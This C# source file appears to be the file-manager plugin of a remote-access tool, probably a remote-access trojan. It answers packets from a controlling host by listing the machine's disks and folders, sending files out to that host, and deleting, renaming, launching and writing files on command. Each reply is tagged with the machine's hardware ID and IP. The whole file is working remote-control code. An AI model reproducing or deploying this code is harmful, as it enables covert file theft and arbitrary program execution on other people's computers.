using PacketLib.Utils;
using PacketLib.Packet;
using PacketLib;
using System.Threading;
using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            string filePath;
            switch (loadingAPI.CurrentPacket.PacketType) 
            {
                case PacketType.FM_GET_DISK:
                    DiskPacket diskPacket = new DiskPacket(GetDisks.GetAllDisks(), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, diskPacket);             
                    break;

                case PacketType.FM_GET_FILES_AND_DIRS:
                    string path = ((FileManagerPacket)loadingAPI.CurrentPacket).path;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(GetFilesAndDirs.GetAllFilesAndDirs(path), loadingAPI.BaseIp, loadingAPI.HWID);
                    fileManagerPacket.path = path;
                    ClientSender(loadingAPI.Host, loadingAPI.Key, fileManagerPacket);
                    break;

                case PacketType.FM_DOWNLOAD_FILE:
                    ClientFileSender(loadingAPI);
                    break;

                case PacketType.FM_DELETE_FILE:
                    filePath = ((DeleteFilePacket)loadingAPI.CurrentPacket).path;
                    Tuple<string, bool> returnFromFunc = DeleteFile.RemoveFile(filePath);
                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(returnFromFunc.Item1, ((DeleteFilePacket)loadingAPI.CurrentPacket).name, returnFromFunc.Item2, loadingAPI.BaseIp, loadingAPI.HWID, ((DeleteFilePacket)loadingAPI.CurrentPacket).fileTicket);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, deleteFilePacket);
                    break;

                case PacketType.FM_START_FILE:
                    filePath = ((StartFilePacket)loadingAPI.CurrentPacket).filePath;
                    StartFile.StartAProcess(filePath);
                    break;

                case PacketType.FM_RENAME_FILE:
                    RenameFilePacket renameFilePacketReceived = (RenameFilePacket)loadingAPI.CurrentPacket;
                    RenameFilePacket renameFilePacket = new RenameFilePacket(renameFilePacketReceived.oldName, renameFilePacketReceived.oldPath, renameFilePacketReceived.newName, renameFilePacketReceived.newPath, loadingAPI.BaseIp, loadingAPI.HWID)
                    {
                        isRenamed = MoveFile.RenameFile(renameFilePacketReceived.oldPath, renameFilePacketReceived.newPath)
                    };
                    ClientSender(loadingAPI.Host, loadingAPI.Key, renameFilePacket);
                    break;

                case PacketType.FM_SHORTCUT_PATH:
                    ShortCutFileManagersPacket shortCutFileManagersPacketReceived = (ShortCutFileManagersPacket)loadingAPI.CurrentPacket;
                    string newPath = "";
                    ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(Shorcuts.ShortcutsWrapper(shortCutFileManagersPacketReceived.shortCuts, ref newPath), loadingAPI.BaseIp, loadingAPI.HWID);
                    shortCutFileManagersPacket.shortCuts = shortCutFileManagersPacketReceived.shortCuts;
                    shortCutFileManagersPacket.path = newPath;
                    ClientSender(loadingAPI.Host, loadingAPI.Key, shortCutFileManagersPacket);
                    break;

                case PacketType.FM_UPLOAD_FILE:
                    UploadFilePacket uploadFilePacketReceived = (UploadFilePacket)loadingAPI.CurrentPacket;
                    UploadFilePacket uploadFilePacket = new UploadFilePacket(uploadFilePacketReceived.path, UploadFile.WriteUploadedFile(uploadFilePacketReceived.path, Compressor.QuickLZ.Decompress(uploadFilePacketReceived.file)), loadingAPI.BaseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.Host, loadingAPI.Key, uploadFilePacket);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        private static void ClientFileSender(LoadingAPI loadingAPI) 
        {
            string filePath = ((DownloadFilePacket)loadingAPI.CurrentPacket).fileName;
            DownloadClientHandler clientHandler = new DownloadClientHandler(loadingAPI, ((DownloadFilePacket)loadingAPI.CurrentPacket).fileTicket, ((DownloadFilePacket)loadingAPI.CurrentPacket).bufferSize);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.StartSendingFile(filePath);
        }

        private static void ClientSender(Host host, string key, IPacket packet) 
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
